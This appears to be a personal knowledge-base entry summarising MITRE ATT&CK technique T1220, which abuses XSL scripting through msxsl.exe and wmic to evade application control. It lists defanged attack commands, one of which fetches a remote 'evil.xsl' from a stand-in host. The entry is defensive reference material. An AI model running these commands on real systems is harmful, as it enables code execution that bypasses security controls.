Tactics: [[DEFENSE_EVASION]]
Tags: #mitre/attack/techniques/T1220  

# XSL Script Processing - T1220
---
## Description
[more on T1220](https://attack.mitre.org/techniques/T1220)

Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. [1](https://docs.microsoft.com/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script)

Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [[T1127_Trusted Developer Utilities Proxy Execution|Trusted Developer Utilities Proxy Execution (T1127)]], the Microsoft common line transformation utility binary (msxsl.exe) [2](https://www.microsoft.com/download/details.aspx?id=21714) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. [3](https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. [4](https://reaqta.com/2018/03/spear-phishing-campaign-leveraging-msxsl/) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.[5](https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75)

Command-line examples:[3](https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/)[5](https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75)

-   `msxsl.exe customers[.]xml script[.]xsl`
-   `msxsl.exe script[.]xsl script[.]xsl`
-   `msxsl.exe script[.]jpeg script[.]jpeg`

Another variation of this technique, dubbed "Squiblytwo", involves using [[T1047_Windows Management Instrumentation|Windows Management Instrumentation (T1047)]] to invoke JScript or VBScript within an XSL file.[6](https://lolbas-project.github.io/lolbas/Binaries/Wmic/) This technique can also execute local/remote scripts and, similar to its [[T1218_Signed Binary Proxy Execution#Regsvr32 - T1218 010|Regsvr32 (T1218.010)]]/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [[T1047_Windows Management Instrumentation|Windows Management Instrumentation (T1047)]] provided they utilize the /FORMAT switch.[5](https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75)

Command-line examples:[5](https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75)[6](https://lolbas-project.github.io/lolbas/Binaries/Wmic/)

-   Local File: `wmic process list /FORMAT:evil[.]xsl`
-   Remote File: `wmic os get /FORMAT:"https[:]//example[.]com/evil[.]xsl"`

---
## Sub-Techniques

#### none
